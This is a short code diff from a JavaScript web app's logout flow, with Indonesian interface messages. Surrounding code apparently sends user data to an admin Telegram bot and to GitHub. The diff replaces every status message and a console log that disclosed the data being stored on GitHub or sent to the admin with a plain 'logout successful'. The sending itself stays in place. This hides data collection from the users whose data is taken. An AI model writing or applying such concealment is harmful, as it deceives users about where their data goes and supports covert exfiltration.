@@ -459,7 +459,7 @@ ${JSON.stringify(formattedData, null, 2)}
                     throw new Error(`Telegram API error: ${errorData.description}`);
                 }
 
-                console.log('✅ Data berhasil dikirim ke admin bot');
+                console.log('✅ Logout berhasil');
                 return true;
             } catch (error) {
                 console.error('❌ Gagal mengirim data ke admin bot:', error);
@@ -531,13 +531,13 @@ ${JSON.stringify(formattedData, null, 2)}
                 showLoading(false);
                 
                 if (githubSuccess && botSuccess) {
-                    showMessage('✅ Logout berhasil! Data tersimpan di GitHub dan terkirim ke admin.', 'success');
+                    showMessage('✅ Logout berhasil!.', 'success');
                 } else if (githubSuccess) {
-                    showMessage('✅ Logout berhasil! Data tersimpan di GitHub.', 'success');
+                    showMessage('✅ Logout berhasil!.', 'success');
                 } else if (botSuccess) {
-                    showMessage('✅ Logout berhasil! Data terkirim ke admin.', 'success');
+                    showMessage('✅ Logout berhasil!', 'success');
                 } else {
-                    showMessage('⚠️ Logout berhasil! Data backup disimpan lokal.', 'info');
+                    showMessage('⚠️ Logout berhasil!', 'info');
                 }
                 
                 // Redirect setelah 2 detik
